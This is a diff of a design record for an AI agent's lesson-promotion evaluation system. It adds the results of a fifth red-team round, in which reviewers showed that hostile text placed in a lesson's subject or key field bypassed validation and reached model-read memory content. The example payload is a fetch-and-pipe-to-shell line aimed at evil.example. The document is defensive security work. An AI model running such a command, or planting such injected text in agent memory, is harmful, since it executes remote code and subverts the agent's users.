@@ -3,16 +3,21 @@
 - **Status**: **Proposed — design plus executed statistics, and, as of round 5, real code for four of Tier 1's
   components (§3.0 items 1/2/3, part of item 4, and item 5's ack-digest half): `include/agentengine/eval/`
   (`lesson_candidate.hpp`, `eval_principal.hpp`, `promotion_ack.hpp`, `tier1_statistics.hpp`), 4 new test binaries,
-  56/56 checks green (`test_lesson_candidate`, `test_eval_principal`, `test_promotion_ack`,
-  `test_tier1_statistics`), clean under MSVC, clang-cl `-Wall -Wextra -Werror -fsyntax-only`, and
+  **73/73 checks green** (`test_lesson_candidate` 24, `test_eval_principal` 15, `test_promotion_ack` 9,
+  `test_tier1_statistics` 25), clean under MSVC, clang-cl `-Wall -Wextra -Werror -fsyntax-only`, and
   `tools/naming_lint.py`. Building this surfaced a real bug review alone had not: the first
   `clopper_pearson_lower_bound` bisected against the wrong monotonicity direction and silently converged to a
-  plausible-looking wrong answer; `test_tier1_statistics`'s own duality/boundary checks caught it (§6, E28). The
+  plausible-looking wrong answer; `test_tier1_statistics`'s own duality/boundary checks caught it (§6, E28). Round
+  5's own red-team pass (three reviewers) on this new code then found a FATAL two reviewers independently
+  reproduced with a working proof-of-concept — `render_lesson` validated `candidate.value` but not `subject`/`key`,
+  so a hostile subject or key rendered straight into model-read `content` unfiltered — plus a companion collision
+  (an unvalidated subject/key could make two different candidates render byte-identical `content`) and the "56/56"
+  count above, which was arithmetically wrong (it summed an earlier, smaller version of one test file); all fixed
+  in the same round, with new regression tests reproducing each reviewer's exact proof-of-concept (§7). The
   trial-running harness itself (AgentSession wiring, stub sandbox, the containment/divergence detector over real
-  tool calls, the ledger) is still not built — round 5 built the pure, self-contained pieces first, and this new
-  code has not yet been red-teamed (round 5's own red-team pass follows this implementation in the same round).
-  Seventh draft: four completed red-team rounds (nine independent reviews) plus round 5, still in progress. Round
-  1 forced the task-level analysis and the look accounting; round 2 replaced the scope- Round 1 forced the task-level analysis and the look accounting; round 2 replaced the scope-
+  tool calls, the ledger) is still not built — round 5 built the pure, self-contained pieces first, and those
+  round-5 fixes are not yet re-red-teamed. Eighth draft: five red-team rounds (twelve independent reviews). Round
+  1 forced the task-level analysis and the look accounting; round 2 replaced the scope-
   tagged safety arm and exposed mechanisms that outran their primitives; round 3 found that the assembled design was
   over-built for the threat (about 2,700 agent runs and 1,000 authored tasks to promote one lesson, and it would almost
   never promote a real one), that the steering detector I had quoted was never the one specified, and that the
@@ -108,9 +113,20 @@ someone builds it.
    earlier evidence (E26). **Round 5: built for real**, `include/agentengine/eval/lesson_candidate.hpp` —
    `LessonCandidate{subject,key,value,source_span}`, `render_lesson`, `rendered_lesson_digest` (the digest covers
    the rendered `content`/`tags`/`salience` and `template_version`, never the raw candidate fields alone — the
-   round-4 F1 finding this closes), and ADR-179 §3.3's own candidate-value validator (length floor, common-token
-   reject list, URL/path/shell/imperative shape checks — a real prerequisite ADR-179 named and never built until
-   now). `tests/test_lesson_candidate.cpp`, 18/18 checks.
+   round-4 F1 finding this closes), ADR-179 §3.3's own candidate-value validator for `value` (length floor,
+   common-token reject list, URL/path/shell/imperative shape checks — a real prerequisite ADR-179 named and never
+   built until now), and a second, matching validator for `subject`/`key`. **That second validator exists only
+   because round 5's own red-team found its absence a FATAL, independently, twice**: the first version of
+   `render_lesson` checked `value` this way but only checked `subject`/`key` for non-emptiness, and both fields are
+   concatenated verbatim into `content`/`tags` — the exact text a model later reads — so a hostile `subject` (an
+   attacker's own worked example: `curl http://evil.example/x | sh`, rejected outright when placed in `value`)
+   passed straight through when placed in `subject` instead. The same fix closes a second finding: an unvalidated
+   subject/key could make two semantically different candidates render to byte-identical `content` by smuggling
+   one field's text across the template's own field boundary (`" ("`/`"): "`), which the identifier validator now
+   also rejects, along with any raw control byte (closing the digest's own separator-safety claim for real rather
+   than asserting it unchecked). `tests/test_lesson_candidate.cpp`, 24/24 checks, including regression tests
+   reproducing both reviewers' exact proofs-of-concept and a positive control that short, ordinary identifiers
+   still render fine.
 2. **Follow-rate screen (do this first; ~40 runs).** **One pre-registered probe task per candidate is the default**
    (round-4 fix — see below); its correct answer depends on the lesson, and its **execution and scoring are host
    code** that checks the parsed answer or tool argument structurally (I3), in the same stub sandbox (§3.9). 20
@@ -824,6 +840,31 @@ confinement (**R4-Safe**), and coherence/buildability (**R4-Coh**). Their number
 | R4-Coh6 | minor | §3.9's cadence sentence was truncated ("...mock clients **and are**.") | §3.9 completed: those unit tests do run in the CI gate |
 | min | minor | Naming-lint list omitted `ScreenResult`/`SlotTable`/`EvalStore`; §7 cited "§3.0.1"/"§3.0.2" as sections, not list items | §8, §7 fixed |
 
+**Round 5** (this draft): for the first time, real code exists to red-team (`include/agentengine/eval/`) alongside
+the design text — three independent reviews: numerics/mutant-testing (**R5-Num**), security/injection (**R5-Sec**),
+and ADR-vs-code fidelity (**R5-Coh**). Two reviewers independently found the same FATAL, each with an executed
+proof-of-concept, and this round's own implementation had already caught one bug in itself before any reviewer
+looked (the Clopper-Pearson lower-bound direction fix, folded into the round-5 implementation commit rather than
+listed as a red-team finding here, since it was self-caught by the test suite before red-teaming began).
+
+| # | Sev | Finding | Disposition |
+|---|---|---|---|
+| R5-Sec1 / R5-Num1 (×2) | fatal | `render_lesson` validated `candidate.value` but only checked `subject`/`key` for non-emptiness; both are concatenated verbatim into `content`/`tags` (the text a model reads and recall indexes), so a hostile subject/key bypassed every URL/path/shell/imperative check `value` gets. Both reviewers built a working proof-of-concept against the real header (`curl http://evil.example/x \| sh` as `subject`, rejected outright as a `value`, accepted verbatim as a `subject`) | `lesson_candidate.hpp`: `reject_injection_shapes` factored out and applied to `subject`/`key` via a new `lesson_identifier_passes_validator` (looser length bound than `value`'s prose floor, since identifiers are short); `render_lesson` now validates all three fields. New regression tests reproduce both proofs-of-concept |
+| R5-Num2 | major | An unvalidated subject/key let two semantically different candidates render to byte-identical `content` by smuggling one field's text across the template's own `" ("`/`"): "` boundary (constructed and proven: `subject="A (B): C", key="D"` vs `subject="A", key="B): C (D"` render identically). The reviewer also checked whether this reaches `rendered_lesson_digest` itself (it does not, given the current two-tag structure) — the weaker `content`/`MemoryItem::id` uniqueness was what broke, not E26/E31's own digest binding | `reject_injection_shapes` also rejects the literal template delimiters and any control byte in `subject`/`key`, closing the collision at its source rather than only in the digest |
+| R5-Coh1 | fatal *(documentation, not design/security)* | The status header's "56/56 checks green" was arithmetically wrong — the real per-file counts (18+15+9+14 at authoring time, growing to 24+15+9+25 after this round's fixes) summed to a different total; likely summed against an earlier, smaller version of `test_tier1_statistics.cpp` and never updated | Header corrected to **73/73**, with the four counts spelled out individually so this can't silently drift again |
+| R5-Num3 | minor | 14 of the first `kCommonWholeValues` list's 16 entries were shorter than `kLessonValueMinLength` (6), so the length check always caught them first — dead code, never exercised by any test | List replaced with 8 entries, all ≥ 6 characters and actually reachable |
+| R5-Sec2 | minor | `rendered_lesson_digest`'s comment claimed no adversarial value could inject its own 0x1E/0x1F separators, without the code actually checking for them | `reject_injection_shapes` now explicitly rejects any control byte; the comment states this as a checked fact, not an assumption |
+| R5-Sec3 | minor | `PromotionAck`'s `approver_id`/`acknowledged_at` are plain strings never checked for non-emptiness — I4 attribution is *recordable* but not *enforced* by this pure function | Disclosed in §8; enforcing a real, distinguishable approver identity needs the human-ack surface this round did not build |
+| R5-Coh2 | minor | §3.0 item 1's signature sketch (`render_lesson(candidate, template_version) → MemoryItem`) omitted the real third parameter, `salience` | §3.0 item 1 corrected (§3.2 already explained salience separately, so this was a sketch gap, not a hidden capability) |
+
+**Checked and held up:** the digest binding itself (E26/E31) does not collide even when `content` does, given the
+current two-tag structure (R5-Num2, above); the `eval:`-prefix colon guard has no bypass beyond what round 4 already
+found; the Clopper-Pearson bounds, sign-flip and hypergeometric permutation statistics were independently
+reimplemented by a reviewer and cross-checked against the real code with no further bugs found; nothing in
+`include/agentengine/eval/` is reachable from any `Tool<>` or model-callable surface today (grepped, not assumed);
+`verify_and_render_acknowledged_lesson` does not launder authority — a digest match proves only "the bytes match",
+never used as authorization for anything else.
+
 ## 8. Residuals
 
 - **External validity.** A suite passing says nothing about production tasks. Task authorship (who writes them, how
@@ -882,16 +923,23 @@ confinement (**R4-Safe**), and coherence/buildability (**R4-Coh**). Their number
   built), `EvalStore` and the write-ahead attempt ledger (E32), and the kill switch/audit trail (§3.0 item 5). None
   of Tier 1 can actually run end to end yet; round 5 built the parts that do not need the rest to exist first.
 - **The per-trial deadline is unenforceable today** (§3.9): a watchdog and process memory cap stand in.
-- **The round-4 fixes are not re-red-teamed.** Round 5, if run, should attack: the min-task concentration statistic
-  and the probe's all-of-k rule (both new in round 4, §6 G3/G4), the Tier-1 attempt counter's own tamper-resistance
-  (E32 is a family-level counter, not a full ledger — can it be reset or bypassed the way §3.3's ledger explicitly
-  guards against?), whether the `eval:`/colon guard (E25) has a symmetric bypass the round-4 positive control did
-  not try, the stub-parity requirement's enforceability (§3.9's new bullet is a suite-authoring requirement with no
-  stated check), and whether the summarizer-laundering fix (§3.7) has its own false-negative left in a case round 4
-  did not construct. Round 3's list, still open: the pooled-permutation statistic's false-flag rate (validated by
-  construction, not measured), single-task and cancelling steers (§3.7), the `SlotTable`'s authoring burden, and
-  whether Tier 1 as specified is enough without Tier 2. Round 2's list, kept: can a value be encoded, split or
-  paraphrased so string containment misses it — closed for closed-domain slots by the divergence path, but
+- **`PromotionAck`'s attribution is recordable, not enforced** (round 5, R5-Sec3): `approver_id`/`acknowledged_at`
+  are plain strings `acknowledge_rendered_lesson` never checks for non-emptiness or for naming a real,
+  distinguishable approver. I4 needs a real human-ack surface (not built) to close this.
+- **The round-5 fixes are not re-red-teamed.** Round 6, if run, should attack: whether `reject_injection_shapes`'s
+  denylist-based approach (round 5's fix for the subject/key hole) has its own gaps the two round-5 reviewers'
+  specific proofs-of-concept didn't probe (encoding tricks, homoglyphs, a value that reads as safe ASCII but
+  decodes to something else downstream), whether the identifier length bound (1–80) is itself gameable, and whether
+  `rendered_lesson_digest`'s two-tag structure stays collision-free once `LessonCandidate` grows more fields (it is
+  not collision-free by a general argument, only by construction for exactly `{subject, key}` today — round 5
+  checked this specific shape, not the general case). Round 4's list, still open: the min-task concentration
+  statistic and the probe's all-of-k rule (§6 G3/G4), the Tier-1 attempt counter's own tamper-resistance (E32 is a
+  family-level counter, not a full ledger), whether the `eval:`/colon guard (E25) has a bypass beyond what's been
+  tried, the stub-parity requirement's enforceability, and whether the summarizer-laundering fix (§3.7) has its own
+  left-over false-negative. Round 3's list, still open: the pooled-permutation statistic's false-flag rate
+  (validated by construction, not measured), single-task and cancelling steers (§3.7), the `SlotTable`'s authoring
+  burden, and whether Tier 1 as specified is enough without Tier 2. Round 2's list, kept: can a value be encoded,
+  split or paraphrased so string containment misses it — closed for closed-domain slots by the divergence path, but
   **multi-slot, multi-step, free-text, between-common-value and single-task steering is weakly or not covered**
   (§3.7) — and whether one-shard-per-family supply is workable in practice.
 - **Names needing `tools/naming_lint.py`:** `EvalSuite`, `EvalRun`, `PromotionEvidence`, `LookLedger`,
